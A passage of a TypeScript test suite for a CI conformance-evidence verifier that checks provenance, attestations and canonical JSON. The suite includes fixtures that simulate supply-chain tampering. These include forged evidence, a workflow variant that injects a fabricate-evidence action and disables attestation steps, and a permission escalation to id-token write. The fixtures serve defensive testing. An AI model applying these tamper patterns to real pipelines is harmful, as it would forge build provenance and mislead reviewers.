  });

  test('rejects malformed frozen registries before aggregation', () => {
    const registry = JSON.parse(readFileSync(registryPath, 'utf8')) as Record<
      string,
      unknown
    >;
    const duplicate = structuredClone(registry) as {
      assertions: { cave: string[] };
    };
    duplicate.assertions.cave.push(duplicate.assertions.cave[0] ?? '');
    expect(() =>
      contract.parseAssertionRegistry(
        JSON.stringify(duplicate),
        'duplicate registry',
      ),
    ).toThrow(/duplicate assertion id/u);

    const missingProvenance = structuredClone(registry);
    delete missingProvenance.provenance;
    expect(() =>
      contract.parseAssertionRegistry(
        JSON.stringify(missingProvenance),
        'missing provenance registry',
      ),
    ).toThrow(/missing required field "provenance"/u);

    const arbitraryExclusion = structuredClone(registry) as {
      notCovered: Array<{ scopeId: string; diagnosticId: string }>;
    };
    arbitraryExclusion.notCovered.pop();
    expect(() =>
      contract.parseAssertionRegistry(
        JSON.stringify(arbitraryExclusion),
        'partial exclusion registry',
      ),
    ).toThrow(/complete frozen exclusion set/u);
  });

  test('executes the JSON Schema and parser for complete platform metadata', () => {
    const lock = readLock();
    const registry = readRegistry();
    const evidence = createPlatformEvidence('darwin-arm64', lock, registry);
    const schema = JSON.parse(readFileSync(schemaPath, 'utf8')) as Record<
      string,
      unknown
    >;
    const validateJsonSchemaValue = requiredFunction(
      'validateJsonSchemaValue',
    );

    expect(() =>
      validateJsonSchemaValue(evidence as never, schema as never, 'record' as never),
    ).not.toThrow();
    expect(
      contract.parsePlatformEvidence(JSON.stringify(evidence), 'record.json'),
    ).toEqual(evidence);

    const unknownMetadata = structuredClone(evidence);
    (
      unknownMetadata.environment as Record<string, unknown>
    ).rawCommand = 'node harness.js';
    expect(() =>
      validateJsonSchemaValue(
        unknownMetadata as never,
        schema as never,
        'record' as never,
      ),
    ).toThrow(/additional property "rawCommand"/u);
    expect(() =>
      contract.parsePlatformEvidence(
        JSON.stringify(unknownMetadata),
        'unknown-metadata.json',
      ),
    ).toThrow(/additional property "rawCommand"/u);
  });

  test('separates the candidate, validator, source, and harness identities', () => {
    const lock = readLock();
    const registry = readRegistry();
    const evidence = createPlatformEvidence('darwin-arm64', lock, registry);
    const provenance = evidence.provenance as {
      candidate: { commit: string; tree: string };
      validator: { commit: string; tree: string };
      cave: { commit: string; tree: string };
      coven: { commit: string; tree: string };
      chat: { commit: string; tree: string };
    };
    const harness = evidence.harness as { commit: string; tree: string };

    expect(provenance.candidate.commit).toBe(
      'acc38488f00860d246c3c553375634d64806eabb',
    );
    expect(provenance.validator.commit).not.toBe(
      provenance.candidate.commit,
    );
    expect(provenance.validator.tree).not.toBe(provenance.candidate.tree);
    for (const identity of [
      provenance.candidate,
      provenance.validator,
      provenance.cave,
      provenance.coven,
      provenance.chat,
      harness,
    ]) {
      expect(identity.commit).toMatch(/^[0-9a-f]{40}$/u);
      expect(identity.tree).toMatch(/^[0-9a-f]{40}$/u);
    }
  });

  test('rejects a validator identity equal to the packed candidate', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    for (const record of records) {
      const provenance = record.provenance as {
        candidate: { commit: string; tree: string };
        validator: { commit: string; tree: string };
      };
      provenance.validator.commit = provenance.candidate.commit;
      provenance.validator.tree = provenance.candidate.tree;
    }

    expect(() => aggregate(records)).toThrow(
      /validator provenance must be distinct from the packed SDK candidate/u,
    );
  });

  test('rejects repeated arbitrary artifact hashes and partial exclusions', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    const repeated = structuredClone(records);
    for (const record of repeated) {
      const packages = (
        record.artifacts as unknown as {
          sdkPackages: Array<{ sha256: string }>;
        }
      ).sdkPackages;
      for (const entry of packages) {
        entry.sha256 =
          '9a574e8bd5178ce2aa20db97e8a741c7c9569515546a2d3089406f41a9d040fe';
      }
    }
    expect(() => aggregate(repeated)).toThrow(/frozen SDK package metadata/u);

    const partial = structuredClone(records);
    for (const record of partial) {
      (record.notCovered as unknown[]).pop();
    }
    expect(() => aggregate(partial)).toThrow(
      /notCovered must equal the complete frozen exclusion set/u,
    );
  });

  test('uses only the frozen Cave assertion IDs at aggregation time', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );

    expect(() => aggregate(records)).not.toThrow();
  });

  test('fails missing, duplicate, unexpected, failed, and skipped results', () => {
    const lock = readLock();
    const registry = readRegistry();
    const createRecords = () =>
      PLATFORMS.map((platform) =>
        createPlatformEvidence(platform, lock, registry),
      );

    const missing = createRecords();
    (missing[0]?.sdkAssertions as unknown[]).pop();
    expect(() => aggregate(missing)).toThrow(/SDK assertion coverage: missing/u);

    const duplicate = createRecords();
    const firstChatAssertion = (
      duplicate[0]?.chatAssertions as Array<Record<string, unknown>>
    )[0];
    if (firstChatAssertion === undefined) {
      throw new Error('Expected a Chat assertion fixture.');
    }
    (duplicate[0]?.chatAssertions as Array<Record<string, unknown>>).push({
      ...firstChatAssertion,
    });
    expect(() => aggregate(duplicate)).toThrow(
      /Chat assertion coverage: duplicate/u,
    );

    const unexpected = createRecords();
    (
      unexpected[0]?.caveRecord as {
        assertions: Array<Record<string, unknown>>;
      }
    ).assertions.splice(1, 0, {
      id: 'cave.unexpected',
      result: 'pass',
      detail: '',
    });
    expect(() => aggregate(unexpected)).toThrow(
      /Cave assertion coverage: unexpected/u,
    );

    const failed = createRecords();
    (
      failed[0]?.sdkAssertions as Array<{ result: string }>
    )[0]!.result = 'fail';
    expect(() => aggregate(failed)).toThrow(/did not pass/u);

    const skipped = createRecords();
    (
      skipped[0]?.chatAssertions as Array<{ result: string }>
    )[0]!.result = 'skip';
    expect(() => aggregate(skipped)).toThrow(/did not pass/u);
  });

  test('deep-canonicalizes aggregate bytes with LF and one trailing newline', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    const serializeCanonicalJson = requiredFunction('serializeCanonicalJson');
    const first = serializeCanonicalJson(
      aggregate(records) as never,
    ) as string;
    const second = serializeCanonicalJson(
      aggregate(
        [...records]
          .reverse()
          .map((record) => reverseObjectKeys(record) as Record<string, unknown>),
      ) as never,
    ) as string;

    expect(Buffer.from(first, 'utf8')).toEqual(Buffer.from(second, 'utf8'));
    expect(first.endsWith('\n')).toBe(true);
    expect(first.endsWith('\n\n')).toBe(false);
    expect(first).not.toContain('\r');
  });

  test('fully parses the canonical aggregate instead of trusting its summary', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    const serializeCanonicalJson = requiredFunction('serializeCanonicalJson');
    const parseAggregatedConformanceEvidence = requiredFunction(
      'parseAggregatedConformanceEvidence',
    );
    const caveEngine = createCaveEngine(registry);
    const canonical = serializeCanonicalJson(
      aggregate(records) as never,
    ) as string;

    expect(
      parseAggregatedConformanceEvidence(
        canonical as never,
        'aggregate.json' as never,
        {
          caveEngine,
          frozenLockText: contract.serializeCanonicalJson(
            createCompatibleLock(),
          ),
        } as never,
      ),
    ).toEqual(JSON.parse(canonical));
    expect(() =>
      parseAggregatedConformanceEvidence(
        serializeCanonicalJson(
          {
            schemaVersion: 2,
            issue: 'OpenCoven/sdk#38',
            kind: 'client-v1-cross-repository-conformance',
            canonicalPlatforms: PLATFORMS,
            candidate: {
              provenance: {
                repository: 'OpenCoven/sdk',
                commit: 'acc38488f00860d246c3c553375634d64806eabb',
              },
            },
            summary: { status: 'passed' },
          } as never,
        ) as never,
        'forged.json' as never,
        {
          caveEngine,
          frozenLockText: contract.serializeCanonicalJson(
            createCompatibleLock(),
          ),
        } as never,
      ),
    ).toThrow(/missing required field/u);

    const copiedClaim = JSON.parse(canonical) as {
      platforms: Array<{
        caveRecord: {
          findings: Array<{ says: string }>;
        };
      }>;
    };
    const finding = copiedClaim.platforms[0]?.caveRecord.findings[0];
    if (finding === undefined) {
      throw new Error('Expected a Cave finding fixture.');
    }
    finding.says = 'fabricated aggregate-copied claim';
    expect(() =>
      parseAggregatedConformanceEvidence(
        serializeCanonicalJson(copiedClaim as never) as never,
        'copied-claim.json' as never,
        {
          caveEngine,
          frozenLockText: contract.serializeCanonicalJson(
            createCompatibleLock(),
          ),
        } as never,
      ),
    ).toThrow(/Cave record does not match the authoritative renderer/u);
  });

  test('binds reviewed protected-job attestations to each primary platform record', () => {
    const lock = readLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    const aggregateRecord = aggregate(records) as unknown as {
      candidate: { provenance: Record<string, unknown> };
      platforms: Array<Record<string, unknown> & { platform: string }>;
      validator: {
        repository: string;
        commit: string;
        tree: string;
      };
    };
    const aggregateText = contract.serializeCanonicalJson(aggregateRecord);
    const aggregatePath =
      'docs/client-v1-cross-repository-results/acc38488f00860d246c3c553375634d64806eabb.json';
    const compatibleLock = createCompatibleLock(lock);
    const index = {
      schemaVersion: 1,
      issue: 'OpenCoven/sdk#38',
      kind: 'client-v1-cross-repository-evidence-index',
      candidate: aggregateRecord.candidate.provenance,
      validator: {
        repository: aggregateRecord.validator.repository,
        commit: aggregateRecord.validator.commit,
        tree: aggregateRecord.validator.tree,
      },
      aggregate: {
        path: aggregatePath,
        size: Buffer.byteLength(aggregateText, 'utf8'),
        sha256: sha256(aggregateText),
      },
      producer: {
        repository: 'OpenCoven/chat',
        commit: 'f'.repeat(40),
        tree: 'c'.repeat(40),
        harness: {
          path: 'scripts/phase1-conformance.mjs',
          version: '0.1.0',
          size: 120_000,
          sha256: '2'.repeat(64),
        },
        workflow: structuredClone(TEST_COMPATIBLE_PRODUCER.workflow),
      },
      platforms: aggregateRecord.platforms.map((record, index_) => {
        const recordText = contract.serializeCanonicalJson(record);
        const artifactSha256 = sha256(recordText);
        return {
          platform: record.platform,
          record: {
            size: Buffer.byteLength(recordText, 'utf8'),
            sha256: sha256(recordText),
          },
          protectedJob: {
            runId: '10000',
            runAttempt: 1,
            jobId: String(20_000 + index_),
            deploymentId: String(40_000 + index_),
            artifactName: `client-v1-conformance-${record.platform}`,
            artifactSha256,
            attestationSubjectSha256: artifactSha256,
            attestationBundleSha256: `${index_ + 3}`.repeat(64),
          },
        };
      }),
    };
    const parseReviewedEvidenceIndex = requiredFunction(
      'parseReviewedEvidenceIndex',
    );

    expect(
      parseReviewedEvidenceIndex(
        contract.serializeCanonicalJson(index) as never,
        'evidence index' as never,
        {
          frozenLock: compatibleLock,
          aggregate: aggregateRecord,
          aggregatePath,
          aggregateText,
        } as never,
      ),
    ).toEqual(index);

    const producerMetadataSubstitutions: Array<{
      name: string;
      mutate: (producer: typeof index.producer) => void;
    }> = [
      {
        name: 'commit',
        mutate: (producer) => {
          producer.commit = 'a'.repeat(40);
        },
      },
      {
        name: 'tree',
        mutate: (producer) => {
          producer.tree = 'b'.repeat(40);
        },
      },
      {
        name: 'harness file metadata',
        mutate: (producer) => {
          producer.harness.sha256 = '3'.repeat(64);
        },
      },
      {
        name: 'workflow byte metadata',
        mutate: (producer) => {
          (producer.workflow as { size: number }).size += 1;
        },
      },
      {
        name: 'reviewed Unix tool-path source metadata',
        mutate: (producer) => {
          (
            producer.workflow.unixToolPathSource as { sha256: string }
          ).sha256 = '5'.repeat(64);
        },
      },
    ];
    for (const substitution of producerMetadataSubstitutions) {
      const substitutedProducer = structuredClone(index);
      substitution.mutate(substitutedProducer.producer);
      expect(
        () =>
          parseReviewedEvidenceIndex(
            contract.serializeCanonicalJson(substitutedProducer) as never,
            `substituted producer ${substitution.name} index` as never,
            {
              frozenLock: compatibleLock,
              aggregate: aggregateRecord,
              aggregatePath,
              aggregateText,
            } as never,
          ),
        substitution.name,
      ).toThrow(/producer does not match the frozen producer/u);
    }

    const fabricated = structuredClone(index);
    fabricated.platforms[0]!.record.sha256 = 'f'.repeat(64);
    expect(() =>
      parseReviewedEvidenceIndex(
        contract.serializeCanonicalJson(fabricated) as never,
        'fabricated evidence index' as never,
        {
          frozenLock: compatibleLock,
          aggregate: aggregateRecord,
          aggregatePath,
          aggregateText,
        } as never,
      ),
    ).toThrow(
      'fabricated evidence index darwin-arm64 artifact and attestation digests must match the indexed record bytes',
    );

    const substitutedArtifact = structuredClone(index);
    substitutedArtifact.platforms[1]!.protectedJob.artifactName =
      'client-v1-conformance-darwin-arm64';
    expect(() =>
      parseReviewedEvidenceIndex(
        contract.serializeCanonicalJson(substitutedArtifact) as never,
        'substituted artifact index' as never,
        {
          frozenLock: compatibleLock,
          aggregate: aggregateRecord,
          aggregatePath,
          aggregateText,
        } as never,
      ),
    ).toThrow(
      'substituted artifact index linux-x64 artifact name does not match its platform',
    );

    const duplicateJob = structuredClone(index);
    duplicateJob.platforms[1]!.protectedJob = structuredClone(
      duplicateJob.platforms[0]!.protectedJob,
    );
    duplicateJob.platforms[1]!.protectedJob.artifactName =
      'client-v1-conformance-linux-x64';
    duplicateJob.platforms[1]!.record.sha256 = '8'.repeat(64);
    duplicateJob.platforms[1]!.protectedJob.artifactSha256 = '8'.repeat(64);
    duplicateJob.platforms[1]!.protectedJob.attestationSubjectSha256 =
      '8'.repeat(64);
    duplicateJob.platforms[1]!.protectedJob.attestationBundleSha256 =
      '9'.repeat(64);
    expect(() =>
      parseReviewedEvidenceIndex(
        contract.serializeCanonicalJson(duplicateJob) as never,
        'duplicate protected job index' as never,
        {
          frozenLock: compatibleLock,
          aggregate: aggregateRecord,
          aggregatePath,
          aggregateText,
        } as never,
      ),
    ).toThrow(
      'duplicate protected job index protected job provenance must be unique per platform',
    );

    const reusedJobId = structuredClone(index);
    reusedJobId.platforms[1]!.protectedJob.jobId =
      reusedJobId.platforms[0]!.protectedJob.jobId;
    expect(() =>
      parseReviewedEvidenceIndex(
        contract.serializeCanonicalJson(reusedJobId) as never,
        'reused job id index' as never,
        {
          frozenLock: compatibleLock,
          aggregate: aggregateRecord,
          aggregatePath,
          aggregateText,
        } as never,
      ),
    ).toThrow(
      'reused job id index protected job and deployment ids must be unique per platform',
    );
  });

  test('authenticates downloaded GitHub records instead of committed aggregate claims', () => {
    const lock = createCompatibleLock();
    const registry = readRegistry();
    const records = PLATFORMS.map((platform) =>
      createPlatformEvidence(platform, lock, registry),
    );
    const aggregateRecord = aggregate(records) as unknown as {
      candidate: { provenance: Record<string, unknown> };
      platforms: Array<Record<string, unknown> & { platform: string }>;
      validator: {
        repository: string;
        commit: string;
        tree: string;
      };
    };
    const aggregateText = contract.serializeCanonicalJson(aggregateRecord);
    const aggregatePath =
      'docs/client-v1-cross-repository-results/acc38488f00860d246c3c553375634d64806eabb.json';
    const producer = TEST_COMPATIBLE_PRODUCER;
    const toolchain = lock.toolchain as {
      nodeVersion: string;
      pnpmVersion: string;
      rustVersion: string;
      tauriVersion: string;
    };
    const recordTexts = new Map(
      aggregateRecord.platforms.map((record) => [
        record.platform,
        contract.serializeCanonicalJson(record),
      ]),
    );
    const bundleTexts = new Map(
      PLATFORMS.map((platform) => [
        platform,
        `${JSON.stringify({ platform, bundle: 'verified-test-bundle' })}\n`,
      ]),
    );
    const ghCalls: string[][] = [];
    const index = {
      schemaVersion: 1,
      issue: 'OpenCoven/sdk#38',
      kind: 'client-v1-cross-repository-evidence-index',
      candidate: aggregateRecord.candidate.provenance,
      validator: {
        repository: aggregateRecord.validator.repository,
        commit: aggregateRecord.validator.commit,
        tree: aggregateRecord.validator.tree,
      },
      aggregate: {
        path: aggregatePath,
        size: Buffer.byteLength(aggregateText, 'utf8'),
        sha256: sha256(aggregateText),
      },
      producer: {
        repository: producer.repository,
        commit: producer.commit,
        tree: producer.tree,
        harness: producer.harness,
        workflow: producer.workflow,
      },
      platforms: PLATFORMS.map((platform, index_) => {
        const recordText = recordTexts.get(platform);
        const bundleText = bundleTexts.get(platform);
        if (recordText === undefined || bundleText === undefined) {
          throw new Error(`Missing test evidence for ${platform}`);
        }
        const recordSha256 = sha256(recordText);
        return {
          platform,
          record: {
            size: Buffer.byteLength(recordText, 'utf8'),
            sha256: recordSha256,
          },
          protectedJob: {
            runId: '10000',
            runAttempt: 1,
            jobId: String(20_000 + index_),
            deploymentId: String(40_000 + index_),
            artifactName: `client-v1-conformance-${platform}`,
            artifactSha256: recordSha256,
            attestationSubjectSha256: recordSha256,
            attestationBundleSha256: sha256(bundleText),
          },
        };
      }),
    };
    const protectedEnvironment = {
      id: Number(producer.workflow.environmentId),
      name: producer.workflow.environment,
      can_admins_bypass: false,
      protection_rules: [
        {
          type: 'required_reviewers',
          prevent_self_review: false,
          reviewers: [
            {
              type: 'User',
              reviewer: {
                id: 68_980_965,
                type: 'User',
              },
            },
          ],
        },
        { type: 'branch_policy' },
      ],
      deployment_branch_policy: {
        protected_branches: true,
        custom_branch_policies: false,
      },
    };

    const execute = (
      command: string,
      arguments_: string[],
      options: {
        cwd?: string;
        env?: Record<string, string | undefined>;
      },
    ): string => {
      expect(command).toBe('/usr/bin/gh');
      expect(options.env).toMatchObject({
        PATH: '/usr/bin:/bin',
        HOME: '/tmp/conformance-home',
        TMPDIR: '/tmp/conformance-tmp',
        GH_HOST: 'github.com',
        GH_TOKEN: 'aggregate-token',
      });
      expect(options.env?.GITHUB_TOKEN).toBeUndefined();
      expect(options.env?.UNRELATED_SECRET).toBeUndefined();
      ghCalls.push([...arguments_]);
      if (arguments_[0] === 'api') {
        const endpoint = arguments_.at(-1) ?? '';
        if (endpoint.includes('/contents/.github/workflows/')) {
          return TEST_PRODUCER_WORKFLOW_TEXT;
        }
        if (endpoint.endsWith('/environments/client-v1-conformance')) {
          return JSON.stringify(protectedEnvironment);
        }
        const runMatch = /\/actions\/runs\/(\d+)$/u.exec(endpoint);
        if (runMatch !== null) {
          const runId = runMatch[1];
          return JSON.stringify({
            id: Number(runId),
            name: producer.workflow.name,
            run_attempt: 1,
            head_sha: producer.commit,
            head_branch: 'main',
            path: producer.workflow.path,
            status: 'completed',
            conclusion: 'success',
            repository: { full_name: producer.repository },
            head_repository: { full_name: producer.repository },
          });
        }
        const jobsMatch =
          /\/actions\/runs\/(\d+)\/attempts\/(\d+)\/jobs\?per_page=100$/u.exec(
            endpoint,
          );
        if (jobsMatch !== null) {
          const runId = Number(jobsMatch[1]);
          const runAttempt = Number(jobsMatch[2]);
          const jobs: Array<Record<string, unknown>> = PLATFORMS.map(
            (platform, index_) => ({
              id: 20_000 + index_,
              run_id: runId,
              run_attempt: runAttempt,
              head_sha: producer.commit,
              html_url:
                `https://github.com/${producer.repository}/actions/runs/`
                + `${runId}/job/${20_000 + index_}`,
              name: producer.workflow.jobNameTemplate.replace(
                '{platform}',
                platform,
              ),
              labels: producer.workflow.runnerLabels[platform],
              workflow_name: producer.workflow.name,
              status: 'completed',
              conclusion: 'success',
            }),
          );
          jobs.push({
            id: 24_000,
            run_id: runId,
            run_attempt: runAttempt,
            head_sha: producer.commit,
            html_url:
              `https://github.com/${producer.repository}/actions/runs/`
              + `${runId}/job/24000`,
            name: 'build-windows-supervisor',
            labels: ['macos-latest'],
            workflow_name: producer.workflow.name,
            status: 'completed',
            conclusion: 'success',
          });
          jobs.push({
            id: 24_100,
            run_id: runId,
            run_attempt: runAttempt,
            head_sha: producer.commit,
            html_url:
              `https://github.com/${producer.repository}/actions/runs/`
              + `${runId}/job/24100`,
            name: producer.workflow.validationJobName,
            labels: ['ubuntu-24.04'],
            workflow_name: producer.workflow.name,
            status: 'completed',
            conclusion: 'success',
          });
          jobs.push({
            id: 24_200,
            run_id: runId,
            run_attempt: runAttempt,
            head_sha: producer.commit,
            html_url:
              `https://github.com/${producer.repository}/actions/runs/`
              + `${runId}/job/24200`,
            name: producer.workflow.attestationJobName,
            labels: ['ubuntu-24.04'],
            workflow_name: producer.workflow.name,
            status: 'completed',
            conclusion: 'success',
          });
          jobs.push({
            id: 25_000,
            run_id: runId,
            run_attempt: runAttempt,
            head_sha: producer.commit,
            html_url:
              `https://github.com/${producer.repository}/actions/runs/`
              + `${runId}/job/25000`,
            name: producer.workflow.aggregationJobName,
            labels: producer.workflow.aggregationRunnerLabels,
            workflow_name: producer.workflow.name,
            status: 'completed',
            conclusion: 'success',
          });
          return JSON.stringify({
            total_count: jobs.length,
            jobs,
          });
        }
        const deploymentMatch = /\/deployments\/(\d+)$/u.exec(endpoint);
        if (deploymentMatch !== null) {
          const deploymentId = Number(deploymentMatch[1]);
          const index_ = deploymentId - 40_000;
          const platform = PLATFORMS[index_];
          if (platform === undefined) {
            throw new Error(`Unexpected test deployment ${deploymentId}`);
          }
          return JSON.stringify({
            id: deploymentId,
            sha: producer.commit,
            ref: 'main',
            task: 'deploy',
            environment: producer.workflow.environment,
            transient_environment: false,
            statuses_url:
              `https://api.github.com/repos/${producer.repository}/deployments/`
              + `${deploymentId}/statuses`,
            repository_url:
              `https://api.github.com/repos/${producer.repository}`,
            performed_via_github_app: {
              slug: 'github-actions',
            },
          });
        }
        const deploymentStatusesMatch =
          /\/deployments\/(\d+)\/statuses\?per_page=100$/u.exec(endpoint);
        if (deploymentStatusesMatch !== null) {
          const deploymentId = Number(deploymentStatusesMatch[1]);
          const index_ = deploymentId - 40_000;
          const platform = PLATFORMS[index_];
          if (platform === undefined) {
            throw new Error(`Unexpected test deployment ${deploymentId}`);
          }
          const jobId = 20_000 + index_;
          const jobUrl =
            `https://github.com/${producer.repository}/actions/runs/10000/job/`
            + `${jobId}`;
          return JSON.stringify([
            {
              state: 'success',
              environment: producer.workflow.environment,
              log_url: jobUrl,
              target_url: jobUrl,
            },
            {
              state: 'pending',
              environment: producer.workflow.environment,
              log_url: jobUrl,
              target_url: jobUrl,
            },
          ]);
        }
        const artifactsMatch =
          /\/actions\/runs\/(\d+)\/artifacts\?/u.exec(endpoint);
        if (artifactsMatch !== null) {
          const runId = Number(artifactsMatch[1]);
          const artifactNameMatch = /[?&]name=([^&]+)/u.exec(endpoint);
          const encodedArtifactName = artifactNameMatch?.[1];
          const artifactName = encodedArtifactName === undefined
            ? undefined
            : decodeURIComponent(encodedArtifactName);
          const platform = PLATFORMS.find(
            (candidate) =>
              producer.workflow.artifactNameTemplate.replace(
                '{platform}',
                candidate,
              ) === artifactName,
          );
          if (platform === undefined) {
            throw new Error(`Unexpected test artifact ${artifactName}`);
          }
          const index_ = PLATFORMS.indexOf(platform);
          return JSON.stringify({
            total_count: 1,
            artifacts: [
              {
                id: 30_000 + index_,
                name: artifactName,
                expired: false,
                workflow_run: {
                  id: runId,
                  head_sha: producer.commit,
                },
              },
            ],
          });
        }
        throw new Error(`Unexpected gh api endpoint ${endpoint}`);
      }
      if (arguments_[0] === 'run' && arguments_[1] === 'download') {
        const artifactName = arguments_[arguments_.indexOf('--name') + 1];
        const destination = arguments_[arguments_.indexOf('--dir') + 1];
        if (artifactName === undefined || destination === undefined) {
          throw new Error('Missing mocked artifact download arguments');
        }
        const platform = artifactName.replace('client-v1-conformance-', '') as
          | (typeof PLATFORMS)[number]
          | undefined;
        const recordText = platform === undefined
          ? undefined
          : recordTexts.get(platform);
        if (recordText === undefined) {
          throw new Error(`Unexpected artifact ${artifactName}`);
        }
        mkdirSync(destination, { recursive: true });
        writeFileSync(resolve(destination, 'record.json'), recordText);
        return '';
      }
      if (
        arguments_[0] === 'attestation'
        && arguments_[1] === 'download'
      ) {
        const artifactPath = arguments_[2];
        if (artifactPath === undefined) {
          throw new Error('Missing mocked attestation artifact path');
        }
        const platform = dirname(artifactPath).split('/').at(-1) as
          | (typeof PLATFORMS)[number]
          | undefined;
        const bundleText = platform === undefined
          ? undefined
          : bundleTexts.get(platform);
        if (bundleText === undefined || options.cwd === undefined) {
          throw new Error(`Unexpected attestation download ${artifactPath}`);
        }
        writeFileSync(
          resolve(options.cwd, `sha256-${sha256(readFileSync(artifactPath))}.jsonl`),
          bundleText,
        );
        return '';
      }
      if (
        arguments_[0] === 'attestation'
        && arguments_[1] === 'verify'
      ) {
        const artifactPath = arguments_[2];
        if (artifactPath === undefined) {
          throw new Error('Missing mocked attestation verification path');
        }
        const platform = dirname(artifactPath).split('/').at(-1) as
          | (typeof PLATFORMS)[number]
          | undefined;
        const platformIndex = platform === undefined
          ? -1
          : PLATFORMS.indexOf(platform);
        if (platform === undefined || platformIndex < 0) {
          throw new Error(`Unexpected attestation verify ${artifactPath}`);
        }
        return JSON.stringify([
          {
            verificationResult: {
              signature: {
                certificate: {
                  runInvocationURI:
                    'https://github.com/OpenCoven/chat/actions/runs/10000/attempts/1',
                  runnerEnvironment: 'github-hosted',
                  sourceRepositoryURI: 'https://github.com/OpenCoven/chat',
                  sourceRepositoryDigest: producer.commit,
                  sourceRepositoryRef: producer.workflow.sourceRef,
                  buildSignerDigest: producer.commit,
                },
              },
              statement: {
                predicateType: producer.workflow.predicateType,
                subject: [
                  {
                    name: 'record.json',
                    digest: {
                      sha256: sha256(readFileSync(artifactPath)),
                    },
                  },
                ],
              },
            },
          },
        ]);
      }
      throw new Error(`Unexpected gh command ${arguments_.join(' ')}`);
    };
    const verificationInput = {
      frozenLockText: contract.serializeCanonicalJson(lock),
      assertionRegistryText: readFileSync(registryPath, 'utf8'),
      schemaText: readFileSync(schemaPath, 'utf8'),
      aggregatePath,
      aggregateText,
      indexText: contract.serializeCanonicalJson(index),
      caveEngine: createCaveEngine(registry),
      execute,
      env: {
        PATH: '/tmp/untrusted-bin',
        HOME: '/tmp/conformance-home',
        TMPDIR: '/tmp/conformance-tmp',
        GH_TOKEN: 'aggregate-token',
        GITHUB_TOKEN: 'broad-token',
        OPENCOVEN_GH_PATH: '/usr/bin/gh',
        UNRELATED_SECRET: 'must-not-reach-gh',
      },
    };
    const verificationInputForWorkflow = (workflowText: string) => {
      const workflowLock = structuredClone(lock);
      const workflowIndex = structuredClone(index);
      const workflowMetadata = {
        ...producer.workflow,
        size: Buffer.byteLength(workflowText, 'utf8'),
        sha256: sha256(workflowText),
      };
      workflowLock.evidenceProducer = {
        ...structuredClone(producer),
        workflow: workflowMetadata,
      };
      workflowIndex.producer.workflow = workflowMetadata;
      return {
        ...verificationInput,
        frozenLockText: contract.serializeCanonicalJson(workflowLock),
        indexText: contract.serializeCanonicalJson(workflowIndex),
      };
    };
    const beforeProtectedUpload = (
      workflowText: string,
      insertedLines: string[],
    ) => {
      const upload = producerArtifactSteps().join('\n');
      expect(workflowText).toContain(upload);
      return workflowText.replace(
        upload,
        `${insertedLines.join('\n')}\n${upload}`,
      );
    };
    const withoutJob = (workflowText: string, job: string) => {
      const start = workflowText.indexOf(`  ${job}:\n`);
      const next = workflowText.indexOf('\n  ', start + 3);
      expect(start).toBeGreaterThanOrEqual(0);
      return (
        workflowText.slice(0, start)
        + workflowText.slice(next < 0 ? workflowText.length : next + 1)
      );
    };

    expect(
      verifyGitHubConformanceEvidence(verificationInput as never).aggregate,
    ).toEqual(aggregateRecord);
    expect(
      ghCalls.filter(
        (arguments_) => arguments_[0] === 'api',
      ),
    ).toHaveLength(13);
    expect(
      ghCalls.filter(
        (arguments_) =>
          arguments_[0] === 'run' && arguments_[1] === 'download',
      ),
    ).toHaveLength(3);
    const attestationVerifications = ghCalls.filter(
      (arguments_) =>
        arguments_[0] === 'attestation' && arguments_[1] === 'verify',
    );
    expect(attestationVerifications).toHaveLength(3);
    expect(
      attestationVerifications.every(
        (arguments_) =>
          arguments_.includes('--source-ref')
          && arguments_.includes('--signer-workflow')
          && arguments_.includes('--deny-self-hosted-runners')
          && arguments_.includes('--bundle'),
      ),
    ).toBe(true);
    expect(
      ghCalls.every((arguments_) => {
        if (arguments_[0] === 'run') {
          return arguments_.includes('github.com/OpenCoven/chat');
        }
        return (
          arguments_.includes('--hostname')
          && arguments_.includes('github.com')
        );
      }),
    ).toBe(true);

    const arbitraryActionDisabledOfficialSteps = beforeProtectedUpload(
      TEST_PRODUCER_WORKFLOW_TEXT,
      [
        '      - uses: example/fabricate-evidence@3333333333333333333333333333333333333333',
        '        with:',
        `          path: ${TEST_RECORD_PATH}`,
      ],
    )
      .replace(
        `      - uses: ${UPLOAD_ARTIFACT_ACTION}\n        with:`,
        `      - uses: ${UPLOAD_ARTIFACT_ACTION}\n        if: false\n        with:`,
      )
      .replace(
        `      - uses: ${ATTEST_BUILD_PROVENANCE_ACTION}\n        with:`,
        `      - uses: ${ATTEST_BUILD_PROVENANCE_ACTION}\n        if: false\n        with:`,
      );
    const invalidWorkflowVariants = [
      {
        name: 'missing validator revision input',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '    inputs:',
            '      validator_revision:',
            '        required: true',
            '        type: string',
            '',
          ].join('\n'),
          '',
        ),
      },
      {
        name: 'missing validation job',
        workflow: withoutJob(
          TEST_PRODUCER_WORKFLOW_TEXT,
          'validate-conformance-artifacts',
        ),
      },
      {
        name: 'missing attestation job',
        workflow: withoutJob(
          TEST_PRODUCER_WORKFLOW_TEXT,
          'attest-conformance-artifacts',
        ),
      },
      {
        name: 'validation skips platform completion',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    needs: platform-conformance',
          '    needs: windows-supervisor',
        ),
      },
      {
        name: 'attestation skips validation',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          '    needs: validate-conformance-artifacts',
          '    needs: platform-conformance',
        ),
      },
      {
        name: 'platform producer gains OIDC authority',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
            '    permissions:',
            '      actions: read',
            '      contents: read',
          ].join('\n'),
          [
            '    permissions:',
            '      actions: read',
            '      contents: read',
            '      id-token: write',
          ].join('\n'),
        ),
      },
      {
        name: 'validation leaves protected environment',
        workflow: TEST_PRODUCER_WORKFLOW_TEXT.replace(
          [
